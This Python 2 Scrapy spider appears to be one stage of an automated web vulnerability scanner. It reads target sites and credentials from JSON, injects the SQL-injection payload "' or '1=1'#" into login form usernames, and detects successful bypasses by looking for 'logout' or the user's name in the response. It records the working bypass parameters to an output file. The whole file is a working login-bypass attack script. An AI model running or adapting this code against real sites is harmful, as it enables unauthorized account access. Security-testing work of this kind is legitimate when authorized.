from scrapy.spider import Spider
from scrapy.selector import Selector
from scrapy.contrib.spiders import CrawlSpider, Rule
from scrapy.contrib.linkextractors.sgml import SgmlLinkExtractor
from dirbot.items import Website
from scrapy.selector import HtmlXPathSelector
from scrapy.contrib.exporter import JsonItemExporter
import scrapy
from scrapy.http.request import Request
from scrapy.http import FormRequest
from scrapy import log
from loginform import fill_login_form
from scrapy.xlib.pydispatch import dispatcher
from scrapy import signals
import copy
import json
import urllib
import time
import chardet

actual_payloads = []
#print actual_payloads
#links = open('links.txt','r')
#print urls
items = []
fin = []
dic = {}
#print searchterms

class step3(Spider):
	name = "step3login"
	
	file4 = open("actualAttacks.txt","w")
	file4.close()
	
	main_file = open("Singleinput.json",'r')
	infoList1 = json.load(main_file)
	infoList = infoList1[0]
	for key,value in infoList.iteritems():
		start_urls =  [str(key)]
		login_urls = [value[0].get("loginurl")]
		login_user = [value[0].get("params")[0].get("username")]
		login_pass = [value[0].get("params")[0].get("password")]
		loginRequired = value[0].get("loginRequired")
		domain = start_urls[0][start_urls[0].find("//") + 2: start_urls[0].find(".com") + 4]
	main_file.close()
	
	urls = []
		
	#actual_payloads.append("'#")
	actual_payloads.append("' or '1=1'#")

	params = []
	loginid = ""
	passid = ""
	login_reqd = "false"
	links = open('linksToAttack.txt','w')

	def parse(self, response):
		#print self.urls
		#print self.loginRequired
		#------------attempt login attacks
		#print self.domain
		with open('data.json') as data_file:
			data = json.load(data_file)
		length = len(data)
		for i in range(0,length):
			jsonval = json.dumps(data[i])
			data2 = json.loads(jsonval)
			self.urls.append(json.loads(jsonval))
			
		if self.loginRequired == "false":
			self.log("nothing to do here")
		else:
			#attempt login attack
			print self.domain
			if 'bm3.com' in self.domain:
				for temp in self.urls:
					for payload in actual_payloads:
						params = temp["param"]
						params["username"] = payload
						params["password"] = "dummy"
						metaobj = {'temp':response.url, 'actualuser':self.login_user[0], 'form':"true", "params":params, 'method':temp["method"]}
						yield FormRequest(response.url, method=temp["method"], meta=metaobj, formdata=params, dont_filter=True, callback=self.check_login_attack)	
			else:
				for payload in actual_payloads:
					inject_uname = self.login_user[0] + payload
					print response.url
					args, url, method, self.loginid, self.passid = fill_login_form(response.url, response.body, inject_uname, "dummy")
					print url + "-----------" + inject_uname
					metaobj = {'temp':url, 'actualuser':self.login_user[0], 'form':"true", "params":args, 'method':method}
					#print "attack: " + str(args)
					yield FormRequest(str(url), method=method, meta=metaobj, formdata=args, dont_filter=True, callback=self.check_login_attack)
		return

	def __init__(self):
		f = open("payloads.json","r")					
		actual_payloads = json.load(f)
		f.close()
		dispatcher.connect(self.spider_closed, signals.spider_closed)

	def check_login_attack(self, response):
		print "here"
		if ('bm3' in self.domain and " ! Your email address" in response.body):
			dic1 ={}
			dic1["method"] = response.request.meta['method']
			dic1["loginurl"] = self.start_urls[0]
			dic1["LoginRequired"] = "false"
			dic1["username"] = response.request.meta["params"]["username"]
			dic1["password"] = response.request.meta["params"]["password"]
			dic1["loginid"] = "username"
			dic1["passid"] = "password"
			#print dic1["LoginRequired"]
			#OtherParameterToWrite #Pending
			dic[self.start_urls[0]] = [dic1]
		elif "logout" in response.body.lower() or response.request.meta["actualuser"] in response.body:
			print "attack successful: payload: " + str(response.request.meta["params"][0][1])
			dic1 ={}
			dic1["method"] = response.request.meta['method']
			dic1["loginurl"] = self.start_urls[0]
			dic1["LoginRequired"] = "false"
			dic1["username"] = response.request.meta["params"][0][1]
			dic1["password"] = response.request.meta["params"][1][1]
			dic1["loginid"] = response.request.meta["params"][0][0]
			dic1["passid"] = response.request.meta["params"][1][0]
			#print dic1["LoginRequired"]
			#OtherParameterToWrite #Pending
			dic[self.start_urls[0]] = [dic1]
		return
	
	def spider_closed(self, spider):
		fin.append(dic)
		f = open("step3loginop.json", 'w')
		f.write(json.dumps(fin,indent= 4, sort_keys = True))
		f.close()
		'''
		fn = "step3output" + str(time.time()) + ".json"
		f = open(fn, "w")
		f.write(json.dumps(fin,indent= 4, sort_keys = True))
		f.close()
		'''

